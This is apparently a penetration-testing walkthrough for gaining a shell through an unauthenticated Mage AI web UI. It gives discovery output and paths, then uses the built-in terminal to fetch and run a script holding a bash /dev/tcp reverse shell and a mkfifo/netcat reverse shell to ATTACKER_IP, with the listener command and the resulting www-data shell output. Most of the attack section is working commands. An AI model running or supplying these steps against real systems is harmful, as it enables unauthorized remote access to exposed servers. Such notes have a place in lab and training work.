# Mage AI

Mage AI can expose an unauthenticated web UI with a built-in terminal. In the observed path, the terminal gave command execution as `www-data`.

Project:

```text
https://github.com/mage-ai/mage-ai
```

## Discovery

Useful indicators:

```text
|_http-title: Apache2 Ubuntu Default Page: It works
6789/tcp open  http  Tornado httpd 6.3.3
|_http-title: Mage
|_http-server-header: TornadoServer/6.3.3
```

WhatWeb may show:

```text
http://TARGET:6789 [200 OK] HTML5, HTTPServer[TornadoServer/6.3.3], Script[application/json], Title[Mage]
```

Add the discovered virtual hosts if the app references them:

```text
TARGET mage.ai docs.mage.ai
```

Useful paths:

```text
http://mage.ai:6789/settings/workspace/preferences
http://mage.ai:6789/terminal
```

The workspace preferences page showed:

```text
v0.9.75
```

## Terminal to www-data

Use the built-in terminal to stage and execute a reverse shell:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
EOF

python3 -m http.server
wget http://ATTACKER_IP:8000/shell.sh
chmod +x shell.sh
```

Start a listener and run the script:

```bash
nc -nlvp 80
/var/www/html/shell.sh
```

Successful shell context:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux zab 5.15.0-122-generic #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64 GNU/Linux
pwd
/var/www/html
```

